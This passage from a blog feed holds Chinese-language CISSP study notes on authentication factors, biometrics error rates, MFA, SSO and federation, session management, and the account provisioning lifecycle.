口令建议</h4><p><strong>口令必须经过哈希</strong>  永远不要以明文形式存储或传输口令。</p><p><strong>口令不应该过期</strong>  不应该要求用户定期更改口令。强制用户更改存在修改单个字符风险，无法增加安全性。</p><p><strong>不应该要求用户使用特殊字符</strong>  特殊字符导致用户记忆口令困难</p><p><strong>用户可以复制和粘贴口令</strong>  密码管理器允许用户创建和存储复杂口令。当复制和粘贴受到限制时，会导致用户设置简单口令。</p><p><strong>用户可以使用所有字符</strong>  口令存储机制通常拒绝使用空格和一些特殊字符。可以让用户创建更易记忆的长口令。</p><p><strong>口令长度至少为8个字符，最多为 64 个字符</strong></p><p><strong>口令系统应该筛选口令</strong> 在接受口令之前，根据常用口令进行检查，例如：123456 或 password</p><h4 id="PCI-DSS-口令要求"><a href="#PCI-DSS-口令要求" class="headerlink" title="PCI DSS  口令要求"></a>PCI DSS  口令要求</h4><ul><li>口令至少每 90 天过期一次</li><li>口令长度至少为 7 个字符</li></ul><p>如果要遵循特定标准，应该至少遵循该标准的最低要求。</p><h2 id="13-2-6-你拥有什么"><a href="#13-2-6-你拥有什么" class="headerlink" title="13.2.6 你拥有什么"></a>13.2.6 你拥有什么</h2><p>智能卡和硬件令牌都是类型 2 身份认证因素示例。</p><h3 id="1-智能卡"><a href="#1-智能卡" class="headerlink" title="1. 智能卡"></a>1. 智能卡</h3><p>智能卡时信用卡大小的 ID 或徽章，并嵌入了集成电路芯片。</p><p>智能卡包含授权用户的信息，用于身份标识和或身份认证。</p><p>智能卡中的数字证书用于非对称加密。</p><p>智能卡具有防篡改功能，为用户提供一种携带和负责加密密钥的简单方法。</p><p>智能卡本身不是有效的身份标识方法，需要配合其他身份认证因素使用。</p><h3 id="2-令牌"><a href="#2-令牌" class="headerlink" title="2. 令牌"></a>2. 令牌</h3><p>令牌设备或硬件令牌时用户可以随身携带的口令生成设备。</p><p>身份认证服务器存储令牌的详细信息，可以随时知道用户令牌上显示的数字。</p><p>令牌通常与另一种身份认证机制联合起来使用。</p><p>硬件令牌设备使用动态一次性口令，比静态口令更安全，动态一次性口令通常为 6 位或 8 位 PIN 码。</p><h4 id="令牌的类型"><a href="#令牌的类型" class="headerlink" title="令牌的类型"></a>令牌的类型</h4><h5 id="同步动态口令令牌"><a href="#同步动态口令令牌" class="headerlink" title="同步动态口令令牌"></a>同步动态口令令牌</h5><p>生成动态口令的硬件令牌和身份认证服务器保持时间同步，定期生成一个新的 PIN 码。</p><p>要求令牌和和服务器都拥有准确的时间。</p><h5 id="异步动态口令令牌"><a href="#异步动态口令令牌" class="headerlink" title="异步动态口令令牌"></a>异步动态口令令牌</h5><p>根据算法和递增计数器生产 PIN 码。</p><p>硬件令牌会创建一个动态的一次性 PIN 码，该 PIN 码在用于身份认证之前保持不变。</p><p>身份认证系统使用令牌标识符和递增计数器来创建一个挑战号码（none，一次性使用数字的缩写），返回给用户，用户通过挑战号码在硬件令牌生成口令。</p><p>硬件令牌可以提供强身份认证，但是存在故障导致无法使用的缺陷。</p><p>使用相同的原理，可以通过用户设备上运行的软件应用程序来提供 PIN 码。</p><h2 id="13-2-7-你是什么"><a href="#13-2-7-你是什么" class="headerlink" title="13.2.7 你是什么"></a>13.2.7 你是什么</h2><p>常见的认证和标识技术是生物识别技术。</p><p>生物特征因素属于类型  3 身份认证因素。</p><p>生物特征因素可以被用作身份标识技术、身份认证技术或二者兼之。</p><p>生物特征因素作为身份标识因素，常用于物理访问控制。</p><ul><li>​需要基于已注册和授权模式的存储数据库对生物特征模式进行一对多的搜索。</li></ul><p>生物特征因素作为身份认证技术</p><ul><li>需要将主体提供的身份特征模式与声明主体身份的存储模式进行一对一匹配。</li></ul><p>生理生物识别方法包括指纹、面部扫描、视网膜扫描、虹膜扫描、手掌扫描（也称为手掌地形或手掌地理）和声纹识别。</p><h4 id="指纹"><a href="#指纹" class="headerlink" title="指纹"></a>指纹</h4><p>指纹是人的手指和拇指上可见的图案。</p><p>指纹对于个人是唯一的。</p><p>指纹拥有环形、螺旋、脊和分叉（也称为细节特征点）。</p><p>在注册过程中捕获用户指纹的步骤通常耗费不到一分钟的时间。</p><h4 id="面部扫描"><a href="#面部扫描" class="headerlink" title="面部扫描"></a>面部扫描</h4><p>面部扫描使用人脸的几何特征进行检测和识别。</p><h4 id="视网膜扫描"><a href="#视网膜扫描" class="headerlink" title="视网膜扫描"></a>视网膜扫描</h4><p>视网膜扫描关注眼睛后部的血管图案。</p><p>视网膜是最精准的生物特征认证方式，可以区分同卵双胞胎。</p><h4 id="虹膜扫描"><a href="#虹膜扫描" class="headerlink" title="虹膜扫描"></a>虹膜扫描</h4><p>虹膜扫描关注瞳孔周围的彩色区域，是第二准确的生物特征认证方式。</p><p>虹膜扫描比视网膜扫描更容易接受。</p><p>扫描可以从远处进行，侵入性较小。</p><p>通常可以从 6 至 12 米之外的地方进行虹膜扫描。</p><p>高质量的图像代替眼睛可以欺骗一些扫描仪。</p><p>照明变化、某些眼镜和隐形眼镜的使用可能影响到扫描的准确性。</p><h4 id="手掌扫描"><a href="#手掌扫描" class="headerlink" title="手掌扫描"></a>手掌扫描</h4><p>手掌扫描通过扫描手掌来识别用户身份。</p><p>手掌扫描仪使用近红外光来策略手掌中的静脉图案。</p><h4 id="声纹识别"><a href="#声纹识别" class="headerlink" title="声纹识别"></a>声纹识别</h4><p>凭借个人说话的特征，称为声纹。</p><p>用户叙述一个特定的短语，并由身份认证系统记录下来。</p><p>认证过程中需要重复相同的短语来进行比较，很少单独使用，而是作为附加的身份认证机制。</p><h4 id="生物特征因素错误评级"><a href="#生物特征因素错误评级" class="headerlink" title="生物特征因素错误评级"></a>生物特征因素错误评级</h4><p>准确率是生物识别设备最重要的方面。</p><p>由于多数人的生物特征相近，因此生物识别方法通常会导致假阴性和假阳性的身份认证。</p><p>生物识别设备通过检查其产生的不同类型的错误来评定设备性能。</p><h5 id="错误拒绝率"><a href="#错误拒绝率" class="headerlink" title="错误拒绝率"></a>错误拒绝率</h5><p>当未对有效主体进行身份认证时，身份认证系统就出现了错误拒绝。也称为假阴性身份认证。</p><p>错误拒绝与有效身份认证的比率被称为错误拒绝率（FRR）。</p><p>错误拒绝也被称为 I 类错误。</p><h5 id="错误接受率"><a href="#错误接受率" class="headerlink" title="错误接受率"></a>错误接受率</h5><p>当对无效主体进行身份认证时，身份认证系统久出现了错误接受。也称为假阳性身份认证。</p><p>误报与有效身份认证的比率是错误接受率（FAR）。</p><p>错误接受也被称为 II 类错误。</p><p>当生物识别设备过于敏感时，错误拒绝（加阴性）更容易发生</p><p>当生物识别设备不够灵敏时，错误接受（误报）更容易发生。</p><h5 id="交叉错误率CER-等错误率（ERR）"><a href="#交叉错误率CER-等错误率（ERR）" class="headerlink" title="交叉错误率CER 等错误率（ERR）"></a>交叉错误率CER 等错误率（ERR）</h5><p>交叉错误率 CER 也被称为等错误率 ERR。</p><p>FRR 和 FAR  百分比相同的点就是 CER。</p><p>CER 作为标准评估值，可以评价不同生物识别设备的准确性。</p><p>CER 较低的设备比 CER 较高的设备更准确。</p><p><img src="/image-20250322164557668.png" alt="image-20250322164557668"></p><p>一般没必要将设备的灵敏度设置为 CER 级别，这通常也是不可取的。</p><p>要根据具体的需求进行针对性设置。</p><h4 id="生物特征注册"><a href="#生物特征注册" class="headerlink" title="生物特征注册"></a>生物特征注册</h4><p>由于注册时间、吞吐率和接受度等因素，生物识别设备可能是无效或不可接受的。</p><p>扫描和存储生物特征因素所需的时间取决于测量的物理或性能特征。</p><p>一般来说，超过 2 分钟的注册时间是不可接受的。</p><p>如果使用随时间变化的生物特征，会增加不便。</p><p>吞吐率是系统扫描主体并允许或拒绝访问所需的时间。</p><p>生物特征越复杂或越详细，系统处理时间就越久。</p><p>用户通常可以接受约 6 秒或更快的吞吐率。</p><h2 id="13-2-8-多因素身份认证-MFA"><a href="#13-2-8-多因素身份认证-MFA" class="headerlink" title="13.2.8 多因素身份认证 MFA"></a>13.2.8 多因素身份认证 MFA</h2><p>多因素身份认证（MFA）是使用两个或更多因素的身份认证。</p><p>双因素身份认证（2FA）需要两种不同的认证因素来实施身份认证。</p><p>使用更多的类型或因素时可以提供更安全的身份认证。</p><p>当采用两种或多种不同的身份认证因素时，两种或更多种不同的攻击方法必须成功收集所有相关的认证因素。</p><h2 id="13-2-9-使用身份认证应用程序进行双因素身份认证"><a href="#13-2-9-使用身份认证应用程序进行双因素身份认证" class="headerlink" title="13.2.9 使用身份认证应用程序进行双因素身份认证"></a>13.2.9 使用身份认证应用程序进行双因素身份认证</h2><p>智能手机和平板电脑支持身份认证器应用程序。</p><p>身份认证器应用程序提供了一种无需硬件令牌即可实现双因素身份认证（2FA) 的简单方法。</p><h3 id="HOTP-标准"><a href="#HOTP-标准" class="headerlink" title="HOTP 标准"></a>HOTP 标准</h3><p>基于哈希的消息身份认证码（HMAC）包含一个哈希函数，该函数被基于 HMAC 的一次性口令（HOTP）标准用来创建一次性口令。</p><p>HOTP 通常生成六至八位数的 HOTP 值。</p><p>HOTP 口令类似于令牌创建的异步动态口令。</p><p>HOTP 口令在使用前保持有效。</p><h3 id="TOTP-标准"><a href="#TOTP-标准" class="headerlink" title="TOTP 标准"></a>TOTP 标准</h3><p>基于时间的一次性口令（TOTP）标准类似于 HOTP 。</p><p>TOTP 使用时间戳并在特定时间范围内保持有效，如 30 秒。</p><p>TOTP 口令类似于令牌使用的同步动态口令。</p><h3 id="电子邮件挑战"><a href="#电子邮件挑战" class="headerlink" title="电子邮件挑战"></a>电子邮件挑战</h3><p>网站可以使用电子邮件挑战进行双因素身份认证（2FA）</p><h3 id="NIST-反对-2FA-使用-SMS-服务"><a href="#NIST-反对-2FA-使用-SMS-服务" class="headerlink" title="NIST 反对 2FA 使用 SMS 服务"></a>NIST 反对 2FA 使用 SMS 服务</h3><p>存在安全风险</p><ul><li>智能手机和平板电脑在不需要用户登录的情况下即可在锁定屏幕上显示短信。</li><li>攻击者可能说服移动运营商将 SMS 消息重定向到攻击者设备，拦截 SMS 消息。</li></ul><h2 id="13-2-10-无口令身份认证"><a href="#13-2-10-无口令身份认证" class="headerlink" title="13.2.10 无口令身份认证"></a>13.2.10 无口令身份认证</h2><p>智能手机和平板电脑直接通过生物特征认证，不需要口令。</p><p>线上快速身份认证（FIDO）</p><p>口令的问题：</p><ul><li>用户拥有多达 90 个在线账户</li><li>多达 51% 的口令被重复使用</li><li>口令是超过 80% 数据泄露的根本原因</li><li>用户因忘记口令而放弃三分之一的网上购物</li></ul><h2 id="13-2-11-设备身份认证"><a href="#13-2-11-设备身份认证" class="headerlink" title="13.2.11 设备身份认证"></a>13.2.11 设备身份认证</h2><h3 id="设备指纹识别"><a href="#设备指纹识别" class="headerlink" title="设备指纹识别"></a>设备指纹识别</h3><p>用户可以在组织中注册自己的设备并将设备与用户账户关联。</p><p>注册期间，设备身份认证系统采集设备特征，例如操作系统和版本、Web浏览器、浏览器字体、浏览器插件、时区、数据存储、屏幕分辨率、cookie 设置和 http 标头等属性来识别设备。</p><p>组织通常使用第三方工具（如 SecureAuth  Identity Provider）进行设备身份认证。</p><p>许多 MDM 系统使用上下文感知身份认证方法来识别设备。</p><p>MDM 系统通常与网络访问控制（NAC）系统一起检查设备的运行情况，并根据 NAC 配置的需求授予或限制访问权限。</p><h3 id="802-1X"><a href="#802-1X" class="headerlink" title="802.1X"></a>802.1X</h3><p>802.1X 可以在某些路由器和交换机上应用于基于端口的身份认证。</p><p>802.1X 通常与无线系统一起使用，强制用户在获得网络访问控制权限之前使用账户登录。</p><h2 id="13-2-12-服务身份认证"><a href="#13-2-12-服务身份认证" class="headerlink" title="13.2.12 服务身份认证"></a>13.2.12 服务身份认证</h2><p>服务账户只是管理员为服务或应用程序（而不是个人）创建的账户。</p><p>Microsoft Exchange Server 为监视电子邮件的第三方工具创建服务账户，也就是创建一个 Microsoft 域账户，并为该账户提供执行任务所需权限。</p><p>微软 SQL Server 存在内置账户，名为 sa （系统管理员的缩写）账户。</p><p>sa 拥有 sysadmin 服务器角色，并对 SQL 实例具有不受限制的权限。</p><p>仅当实例被配置为身份认证时才启用 sa 账户。</p><p>旧版本中 ，sa 账户的默认口令为空，攻击者会针对性检查口令是否为空或弱口令。</p><p>服务账户无法响应定时更改口令消息，只能被锁定或设置为非交互式账户（避免用户使用传统登录方式登录账户）。</p><p>可以将服务配置为基于证书的身份认证。</p><p>证书被颁发给运行服务的证书，并在访问资源时由服务提供。</p><h2 id="13-2-13-双向身份认证"><a href="#13-2-13-双向身份认证" class="headerlink" title="13.2.13 双向身份认证"></a>13.2.13 双向身份认证</h2><p>双向身份认证方法通常使用数字证书。</p><h1 id="13-3-实施身份管理"><a href="#13-3-实施身份管理" class="headerlink" title="13.3 实施身份管理"></a>13.3 实施身份管理</h1><p>身份管理实现技术通常分为两类：集中式和分散式&#x2F;分布式</p><h2 id="集中式"><a href="#集中式" class="headerlink" title="集中式"></a>集中式</h2><p>所有授权验证都由系统内的单个实体执行。</p><p>适合小型团队或个人</p><p>开销小</p><p>可以通过扩展来支持更多用户，例如微软的域控。</p><p>可能会产生单点故障</p><h2 id="分散式-分布式"><a href="#分散式-分布式" class="headerlink" title="分散式&#x2F;分布式"></a>分散式&#x2F;分布式</h2><p>整个系统中的各类实体执行授权验证。</p><p>需要多个团队或多人管理</p><p>管理开销较高</p><p>整个系统难以保持一致性。</p><p>任何单点访问控制点所做的修改均需要在所有访问点重复。</p><h2 id="13-3-1-单点登录"><a href="#13-3-1-单点登录" class="headerlink" title="13.3.1 单点登录"></a>13.3.1 单点登录</h2><p>单点登录（SSO）是一种集中式访问控制技术，允许主体在系统上进行单次身份认证并访问多个资源，而不必再次进行身份认证。</p><p>SSO 的缺点：攻击者一旦侵入账户，就可以获得对所有授权资源的无限制访问权限。</p><h3 id="1-LDAP-与集中式访问控制"><a href="#1-LDAP-与集中式访问控制" class="headerlink" title="1. LDAP 与集中式访问控制"></a>1. LDAP 与集中式访问控制</h3><p>在单个组织内，集中式访问控制系统往往应用于 SSO。</p><p>许多目录服务都基于轻量级目录访问协议（Lightweight Directory Access Protocol，LDAP），例如，微软活动目录域服务（AD DS ）是基于 LDAP 的。</p><p>多域和信任通常用于访问控制系统。</p><p>安全域是共享通用安全策略的主体和客体的集合，各个安全域可以独立于其他域运行。</p><p>各域之间建立信任，创建安全桥，并允许一个域的用户访问另一个域的资源。</p><p>信任可以是单向的，也可以是双向的。</p><h3 id="2-LDAP-与-PKI"><a href="#2-LDAP-与-PKI" class="headerlink" title="2. LDAP 与 PKI"></a>2. LDAP 与 PKI</h3><p>公钥基础设施（PKI）使用 LDAP。</p><p>PKI 是一组在数据证书生命周期中管理数字证书的技术。</p><p>客户端需要查询发证机构（CA）以获取有关证书的信息，并且使用的协议之一就是 LDAP 。</p><p>LDAP 和集中式访问控制系统可用于支持 SSO 功能。</p><h2 id="SSO-与联合身份标识"><a href="#SSO-与联合身份标识" class="headerlink" title="SSO  与联合身份标识"></a>SSO  与联合身份标识</h2><p>基于云扽应用程序使用联合身份管理（FIM）系统，该系统是一种 SSO 形式。</p><p>身份管理是对用户身份及凭证的管理。</p><p>联合身份是指将一个系统中的用户身份与多个身份管理系统关联起来。</p><p>FIM 将其扩展到单个组织之外。多个组织可以加入一个联盟或组，并同意共享身份信息。</p><p>联盟中的成员身份不会自动授予每个人访问联盟其他成员拥有资源的权限。</p><p>每个组织决定共享哪些资源。</p><p>实现联合身份管理系统的方法，基于包括安全断言标记语言（SAML）、OAuth 和 OpenID Connect（OIDC）</p><h3 id="1-基于云的联合"><a href="#1-基于云的联合" class="headerlink" title="1. 基于云的联合"></a>1. 基于云的联合</h3><p>基于云的联合通常使用第三方服务来共享联合身份。</p><p>云计算联合的常见方法是将用户内部登录 ID 与联合身份关联。</p><p>用户使用正常登录 ID  在组织内登录，联合身份管理系统使用用户的登录 ID 来检索匹配的联合身份。</p><h3 id="2-本地联合"><a href="#2-本地联合" class="headerlink" title="2. 本地联合"></a>2. 本地联合</h3><p>联合身份管理系统可以托管在本地、云上，也可以将两者结合为混合系统。</p><p>创建本地联合身份管理系统，共享身份认证数据，允许用户继续正常登录，但也可以访问另一个公司的网络资源。</p><h3 id="3-混合联合"><a href="#3-混合联合" class="headerlink" title="3. 混合联合"></a>3. 混合联合</h3><p>混合联合是云计算联合和本地联合的组合。</p><h3 id="4-准时制"><a href="#4-准时制" class="headerlink" title="4. 准时制"></a>4. 准时制</h3><p>一些联合身份解决方案支持准时制（JIT）配置。</p><p>这些解决方案自动创建两个实体之间的关系，以便新用户访问资源。JIT 解决方案不需要管理员干预即可创建连接。</p><p>通过 JIT 配置，员工可以正常登录雇主的网络，当员工第一次访问福利站点时，JIT 系统与雇主网络交换数据，并创建员工的账户。</p><p>JIT 系统通常使用 SAML 来交换所需的数据。</p><p>SAML 为实体间各种数据的交换提供非常大的灵活性。</p><h2 id="13-3-3-凭证管理系统"><a href="#13-3-3-凭证管理系统" class="headerlink" title="13.3.3 凭证管理系统"></a>13.3.3 凭证管理系统</h2><p>凭证管理系统为用户和密码提供存储空间。</p><p>W3C 发布凭证管理第  1 级 API 工作草案。</p><p>API 提供了一些开发人员通过编程实现的优势：</p><ul><li>在用户登录后询问是否存储凭证</li><li>显示账户选择器，允许用户跳过表单</li><li>允许用户在后续访问中自动登录，即使会话已经过期</li></ul><p>一些联合身份管理解决方案使用凭证管理 API，允许不同的 Web 应用程序使用联合身份提供者来实现 SSO 解决方案。</p><p>身份即服务或身份和访问即服务（IDaaS）是提供身份和访问管理的第三方服务。</p><p>IDaaS 有效地为云平台提供 SSO，并且在内部客户端访问基于云的软件即服务（SaaS）应用程序是特别有用。</p><h2 id="13-3-4-凭证管理器应用程序"><a href="#13-3-4-凭证管理器应用程序" class="headerlink" title="13.3.4 凭证管理器应用程序"></a>13.3.4 凭证管理器应用程序</h2><p>Windows 凭证管理器当用户在浏览器或 Windows 应用程序汇总输入凭证时，凭证管理器会询问是否保存凭证，凭证管理器加密凭证并进行存储。</p><p><strong>需要使用强效的主口令来保护所有其他凭证</strong>。</p><h2 id="13-3-5-脚本访问"><a href="#13-3-5-脚本访问" class="headerlink" title="13.3.5 脚本访问"></a>13.3.5 脚本访问</h2><p>脚本访问或登录脚本可以提供自动传输登录凭证，以建立通信链接。</p><p>脚本访问通常可以模拟 SSO。</p><p>脚本可以在未真正实现 SSO 技术的环境中模拟实现 SSO。</p><p><strong>关注点</strong></p><p>由于脚本和批处理文件通常包含明文形式的访问凭证，因此需要存储在受保护的区域。</p><h2 id="13-3-6-会话管理"><a href="#13-3-6-会话管理" class="headerlink" title="13.3.6 会话管理"></a>13.3.6 会话管理</h2><p>无论使用哪种类型的身份认证系统，都应该使用<strong>会话管理方法防止未经授权的访问</strong>。</p><p>屏幕保护程序可以启用口令保护功能，该功能显示登录屏幕并强制用户在退出屏幕保护程序之前再次进行身份认证。</p><p>屏幕保护程序可以配置时间范围（以分钟为单位）。通常设置在 10 到 20 分钟之间。</p><p>安全的在线会话通常也会在一段时间后断开。</p><p>Web 开发框架来实现会话管理。</p><p>会话开始时创建会话标识符或令牌，标识符会体现在整个会话期间的每个 HTTP 请求中，需要<strong>强制使用传输层安全（TLS）协议</strong>，确保整个会话（包括标识符）都被加密。</p><p>会话超时时间，高价值的应用程序（如访问财务数据的应用程序）的超时范围通常为 2 至 5 分钟。低价值的应用程序的超时范围通常为 15 至 20 分钟。</p><p>开发人员自己使用开发语言编写的管理会话，但是可能存在包含漏洞的代码。</p><h1 id="13-4-管理身份和访问配置生命周期"><a href="#13-4-管理身份和访问配置生命周期" class="headerlink" title="13.4 管理身份和访问配置生命周期"></a>13.4 管理身份和访问配置生命周期</h1><p>身份和访问配置生命周期是指账户的创建、管理和删除。</p><p>身份识别发生在主体声称身份时。</p><p>用户账户是最常见的身份标识，但身份标识也包括计算机账户和服务账户。</p><h2 id="13-4-1-配置和入职"><a href="#13-4-1-配置和入职" class="headerlink" title="13.4.1 配置和入职"></a>13.4.1 配置和入职</h2><p>创建新员工用户账户并为其提供新工作所需的所有权限。</p><p>账户创建流程必须通过组织安全策略程序保护该流程。</p><p>账户创建必须提供用户的多个详细信息，如用户名、电子邮件地址、生物识别数据（如果使用生物特征认证）等。</p><p>应通过组织认为充分且必要的方式来证明新员工身份。例如：身份证件、出生证明、背景调查、信用检查、安全许可验证、FBI数据库搜索和征信调查。</p><p>许多组织都拥有自动配置系统。可以自动配置创建账户，如果使用组或角色功能，也可以根据部门或职责自动将新用户账户添加到适当的组中。</p><p>在向员工发放硬件时，务必保持准确的记录。</p><p>入职流程包括以下条目：</p><ul><li>让员工阅读并签署组织可接受的使用策略（AUP）</li><li>解读安全最佳实践，如电子邮件如何避免感染</li><li>复习组织的移动设备策略（如果适用）</li><li>确保员工的计算机可运行且可登录</li><li>帮助员工配置口令管理器（如果可用）</li><li>协助员工配置双因素身份认证（如果可用）</li><li>说明如何联系服务台人员来获得进一步的帮助</li><li>向员工展示如何访问、共享和保护资源</li></ul><h2 id="13-4-2-取消配置和离职"><a href="#13-4-2-取消配置和离职" class="headerlink" title="13.4.2 取消配置和离职"></a>13.4.2 取消配置和离职</h2><p>当员工离职时，组织会实施取消配置和离职流程。</p><p>离职流程包括员工因故被解雇、被裁员或主动离职。</p><p>员工更换部门或工作地点时，可以使用相同的流程。</p><p>取消账户最简单方法是删除，也被称为账户注销。此过程可以删除员工在受雇期间拥有的所有访问权限，取消账户也有可能删除对用户数据的访问权限。</p><p>许多组织选择在员工离职时禁用该账户。主管可查看用户数据、修改用户口令以雇员身份登录解密加密数据。</p><p>一般规定 30 天内删除禁用账户，具体时限可能因组织的需要而异。</p><p>离职后保留对账户的访问权限，组织遭到破坏的风险非常高。存在被员工恶意操作他人盗用账户使用、导致日志记录错误。</p><p>取消配置的流程包括回收发给员工的所有硬件。</p><p>离职流程中需要包含员工福利的终止。</p><h2 id="13-4-3-定义新角色"><a href="#13-4-3-定义新角色" class="headerlink" title="13.4.3 定义新角色"></a>13.4.3 定义新角色</h2><p>员工职责变化后，需要注意定义新角色以及该角色中员工所需的权限。</p><h2 id="13-4-4-账户维护"><a href="#13-4-4-账户维护" class="headerlink" title="13.4.4 账户维护"></a>13.4.4 账户维护</h2><p>账户的生命周期中，需要对账户进行持续的维护。</p><p>灵活或动态组织层次结构和高员工流动率和晋升率，账户管理更多。</p><p>静态组织层次结构和低员工流动率或晋升率的组织，账户管理更少。</p><p>组织应建立类似创建账户时的程序来管理访问权限的更改。</p><p>未经授权的增加或减少账户的访问能力，可以能会导致严重的安全影响。</p><h2 id="13-4-5-账户访问审查"><a href="#13-4-5-账户访问审查" class="headerlink" title="13.4.5 账户访问审查"></a>13.4.5 账户访问审查</h2><p>管理员会定期检查账户以明确账户不存在多余的权限。</p><p>账户审查工作还检查账户是否符合安全策略。</p><p>账户包括用户账户、系统账户和服务账户。</p><p>计算机的本地系统账户通常与本地管理员账户具有相同的权限，从而允许计算机以计算机（而不是用户）的身份访问网络上的其他计算机。</p><p>部分应用程序会使用本地系统账户用作服务账户</p><p>优势：可以不创建特别的服务账户</p><p>劣势：本地系统账户通常权限过大</p><p>使用脚本定期检查非活动账户，例如：</p><ul><li>检查过去 30 天内未登录的用户账户并自动将其禁用</li><li>检查</li></ul><h1 id="13-6-考试要点"><a href="#13-6-考试要点" class="headerlink" title="13.6 考试要点"></a>13.6 考试要点</h1><h2 id="了解物理访问控制如何保护资产"><a href="#了解物理访问控制如何保护资产" class="headerlink" title="了解物理访问控制如何保护资产"></a>了解物理访问控制如何保护资产</h2><p>物理访问控制是看得见摸得着的，通过控制访问和控制环境来直接保护系统、设备和设备，还通过限制物理访问来间接地保护信息和应用程序</p><h2 id="了解逻辑访问控制如何保护资产"><a href="#了解逻辑访问控制如何保护资产" class="headerlink" title="了解逻辑访问控制如何保护资产"></a>了解逻辑访问控制如何保护资产</h2><p>逻辑访问控制包括身份认证、授权和许可</p><p>限制谁可以访问存储在系统和设备上的信息</p><p>限制对系统和设备设置的访问</p><h2 id="了解主体和客体之间的区别"><a href="#了解主体和客体之间的区别" class="headerlink" title="了解主体和客体之间的区别"></a>了解主体和客体之间的区别</h2><p>主体是访问被动对象（如文件）的主动主体（如用户）。</p><p>用户是在执行某些操作或完成工作任务时访问对象的主体。</p><h2 id="了解身份标识和身份认证之间的区别"><a href="#了解身份标识和身份认证之间的区别" class="headerlink" title="了解身份标识和身份认证之间的区别"></a>了解身份标识和身份认证之间的区别</h2><p>访问控制依赖有效的身份标识和身份认证。</p><p>主体声明身份，身份标识可以如用户名那样简单。</p><p>主体通过提供身份认证凭证（例如与用户名匹配的口令）来证明身份。</p><h2 id="了解身份的创建、注册和证明"><a href="#了解身份的创建、注册和证明" class="headerlink" title="了解身份的创建、注册和证明"></a>了解身份的创建、注册和证明</h2><p>新员工通过护照、驾照或出生证明等官方文件明确其身份。</p><p>然后人力资源同事开始注册过程，包括为新员工创建一个账户。</p><p>当使用生物特征认证时，注册过程也会收集生物特征数据。</p><p>身份证明包括基于知识的身份认证和认知口令。</p><p>认知口令想用户提出一系列仅用户自己知道的问题。</p><h2 id="了解授权和问责之间的区别"><a href="#了解授权和问责之间的区别" class="headerlink" title="了解授权和问责之间的区别"></a>了解授权和问责之间的区别</h2><p>对主体进行身份认证后，系统会根据已证实的身份授予主体对客体的访问权限。</p><p>审计日志和审计踪迹记录事件，包括执行操作的主体身份。</p><p>问责需要结合有效的身份标识、身份认证和审计。</p><h2 id="了解主要身份认证因素的详情"><a href="#了解主要身份认证因素的详情" class="headerlink" title="了解主要身份认证因素的详情"></a>了解主要身份认证因素的详情</h2><p>身份认证的三个主要因素是“你知道什么”（如口令或PIN）、“你拥有什么”（如智能卡或令牌）以及“你是什么”（基于生物识别）。</p><p>多因素身份认证包括两个或多个身份认证因素，比使用单个身份认证因素的方法更安全。</p><p>口令是最弱的身份认证形式，但密码策略通过强制执行口令复杂性和历史记录的要求来帮助提高安全性。</p><p>智能卡包括微处理器和加密证书，而令牌生成一次性口令。</p><p>生物识别方法基于指纹等特征来识别用户。</p><p>交叉错误率（CER）体现了生物识别方法的准确性，是错误拒绝率（FRR）等于错误接受率（FAR）的位置。</p><h2 id="了解单点登录"><a href="#了解单点登录" class="headerlink" title="了解单点登录"></a>了解单点登录</h2><p>单点登录的机制允许主体在系统上进行单次身份认证并访问多个资源，而不必再次进行身份认证。</p><h2 id="描述如何实施联合身份管理系统"><a href="#描述如何实施联合身份管理系统" class="headerlink" title="描述如何实施联合身份管理系统"></a>描述如何实施联合身份管理系统</h2><p>FIM 系统可以托管在本地（提供最大的控制），通过第三方云服务实现，也可将两者结合为混合系统。</p><h2 id="描述准时制（JIT）供应"><a href="#描述准时制（JIT）供应" class="headerlink" title="描述准时制（JIT）供应"></a>描述准时制（JIT）供应</h2><p>JIT 配置可以在用户首次登录第三方站点时创建用户账户。</p><p>JIT 减少了管理负担。</p><h2 id="了解凭证管理系统"><a href="#了解凭证管理系统" class="headerlink" title="了解凭证管理系统"></a>了解凭证管理系统</h2><p>凭证管理系统可以帮助开发人员轻松存储用户名和口令，并在用户重新访问网站时进行检索。</p><p>W3C 于 2019 年将凭证管理 API 作为工作草案发布出来，开发人员 通常将其用作凭证管理系统。</p><p>凭证管理系统允许用户自动登录网站，而不必再次输入凭证。</p><h2 id="解释会话管理"><a href="#解释会话管理" class="headerlink" title="解释会话管理"></a>解释会话管理</h2><p>会话管理流程通过关闭空闲会话来预防未经授权的反问。</p><p>开发人员通常使用 Web 框架来实现会话管理。</p><p>框架允许开发人员确保会话在空闲一定时间后关闭，例如 2 分钟后。</p><h2 id="了解身份和访问配置生命周期"><a href="#了解身份和访问配置生命周期" class="headerlink" title="了解身份和访问配置生命周期"></a>了解身份和访问配置生命周期</h2><p>身份和访问配置生命周期是指账户的创建、管理和删除。</p><p>配置流程可以确保账户根据任务要求分配适当的权限，并且员工可以获得所需的硬件设备。</p><p>入职流程告知员工组织流程。</p><p>当员工离开时，取消配置流程会禁用或删除账户，离职流程可确保员工归还组织发给他们的所有硬件。</p><h2 id="解释角色定义的重要性"><a href="#解释角色定义的重要性" class="headerlink" title="解释角色定义的重要性"></a>解释角色定义的重要性</h2><p>当组织创建新的工作角色时，务必确定这些新角色所需的权限。这样做可以确保这些新角色中的员工没有过多的权限。</p><h2 id="描述账户访问审查的目的"><a href="#描述账户访问审查的目的" class="headerlink" title="描述账户访问审查的目的"></a>描述账户访问审查的目的</h2><p>对用户账户、系统账户和服务账户开展账户访问审查。</p><p>审查确保账户没有过多的权限。</p><p>账户访问审查通常可以检测账户何时拥有过多的权限，以及何时没有禁用或删除未使用的账户。</p><h1 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h1><p>联合身份管理系统</p><p>NIST</p><p>多因素认证</p><p>指纹生物识别</p><p>问责制</p><p>取消配置和离职</p><p>账户访问审查</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>rpm</title>
    <link href="/2025/03/13/yunwei/yunweicommands/Linuxcommands/rpm/"/>
    <url>/2025/03/13/yunwei/yunweicommands/Linuxcommands/rpm/</url>
    
